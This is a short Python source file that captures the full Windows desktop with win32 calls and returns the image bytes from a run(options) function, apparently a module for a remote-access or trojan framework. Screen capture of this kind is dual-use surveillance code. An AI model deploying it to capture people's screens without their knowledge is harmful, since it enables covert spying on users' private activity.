import win32api
import win32con
import win32gui
import win32ui
import base64


def get_dimentions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    return width, height, left, top


def take_screenshot(name):
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimentions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)

    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


def run(options):
    print('[*] Screenshot module.')

    filename = options.get('filename', 'screen')

    take_screenshot(filename)

    with open(f'{filename}.bmp', 'rb') as screenshot_file:
        img = screenshot_file.read()

    print('[*] Success!')

    return str(img)
